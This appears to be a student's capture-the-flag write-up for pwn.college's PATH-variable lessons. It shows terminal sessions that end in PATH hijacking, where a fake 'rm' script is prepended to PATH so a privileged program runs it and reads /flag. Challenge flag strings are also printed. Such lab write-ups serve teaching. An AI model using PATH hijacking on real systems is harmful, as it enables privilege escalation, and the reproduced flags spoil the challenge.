## The PATH Variable 
There is a special shell variable, called PATH, that stores a bunch of directory paths in which the shell will search for programs corresponding to commands.<br>
The PATH variable is crucial in a Linux , as it defines the directories the shell searches when you enter a command. If the directories where your executable commands are located aren't included in the PATH variable, the shell won't be able to find those commands, resulting in an error.

Without PATH, commands (like `ls`, `cd`, etc ) wont work.
**Solution:** <br>
` PATH=""`<br>
`/challenge/run`<br>
## Setting PATH 
**Solution:** <br>
` PATH=/challenge/more_commands/` <br>
`/challenge/run` <br>
## Adding Commands 
`ls -l` is used to list the permissions.<br>
**Solution:** <br>
`hacker@path~adding-commands:~$ nano win`<br>
`hacker@path~adding-commands:~$ cat win`<br>
`cat /flag`<br>
`hacker@path~adding-commands:~$ chmod +x win` <br> 
`hacker@path~adding-commands:~$ echo $PATH` <br>
`/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`<br>
`hacker@path~adding-commands:~$ PATH=$PATH:/home/hacker`<br>
`hacker@path~adding-commands:~$ echo $PATH`<br>
`/nix/store/3v4hdb2gmpj7jv2z848ikakhzl9rjgwh-code-server/libexec/code-server/lib/vscode/bin/remote-cli:/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/hacker`<br>
`hacker@path~adding-commands:~$ /challenge/run`<br>
`Invoking 'win'....`<br>

`pwn.college{AUAPy6vefK7TJfjpzt_SBJn0UA2.dZzNyUDLyEDN1czW}`<br>

## Hijacking Commands
**Solution:** <br>
`hacker@path~hijacking-commands:~$ nano rm`<br>
`hacker@path~hijacking-commands:~$ ls -l rm`<br>
`-rw-r--r-- 1 hacker hacker 10 Oct 21 20:36 rm`<br>
`hacker@path~hijacking-commands:~$ chmod a=rwx rm`<br>
`hacker@path~hijacking-commands:~$ pwd`<br>
`/home/hacker`<br>
`hacker@path~hijacking-commands:~$ export PATH=/home/hacker:$PATH`<br>
`hacker@path~hijacking-commands:~$ /challenge/run` <br>
`Trying to remove /flag...`<br>
`Found 'rm' command at /home/hacker/rm. Executing!`<br>
`pwn.college{QSozNlzOOCrBDI2XnLoVERvYtsr.ddzNyUDLyEDN1czW}`<br>




